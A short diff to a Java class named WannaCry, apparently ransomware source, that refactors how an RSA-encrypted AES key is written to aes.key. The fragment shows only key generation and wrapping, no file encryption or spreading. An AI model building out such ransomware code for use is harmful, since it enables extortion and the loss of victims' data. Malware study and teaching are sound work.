@@ -2,9 +2,7 @@ import javax.crypto.Cipher;
 import javax.crypto.KeyGenerator;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.IvParameterSpec;
-import java.io.File;
-import java.io.FileInputStream;
-import java.io.FileOutputStream;
+
 import java.nio.file.Files;
 import java.nio.file.Paths;
 import java.security.KeyFactory;
@@ -41,9 +39,7 @@ public class WannaCry {
             byte[] encryptedAesKey = encryptAesKey(aesKey.getEncoded(), masterPublicKey);
             
             // Save encrypted AES key to aes.key
-            try (FileOutputStream fos = new FileOutputStream("aes.key")) {
-                fos.write(encryptedAesKey);
-            }
+            Files.write(Paths.get("aes.key"), encryptedAesKey);
             
         } catch (Exception e) {
             System.err.println("Error: " + e.getMessage());
